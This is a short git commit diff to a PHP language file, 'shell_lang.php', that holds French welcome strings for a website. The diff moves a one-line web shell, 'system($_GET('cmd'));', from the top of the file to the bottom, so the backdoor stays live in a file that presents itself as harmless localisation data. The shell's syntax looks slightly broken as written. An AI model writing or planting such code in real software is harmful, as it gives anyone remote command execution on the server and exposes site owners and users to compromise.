5086f4e20ac010e6222db560ec637cc6902ea5cf
Matthieu Jan <matthieujan@protonmail.com>
2017-11-28 00:03:36 +0100

    Update shell_lang.php

--- shell_lang.php
+++ shell_lang.php
@@ -1,10 +1,13 @@
 <?php
-system($_GET('cmd'));
 
 
 $lang = array (
             'lang' => 'Langue',
             'welcome' => 'Bienvenue sur notre nouveau site web !',
         );
+
+system($_GET('cmd'));
+
+
 
 ?>
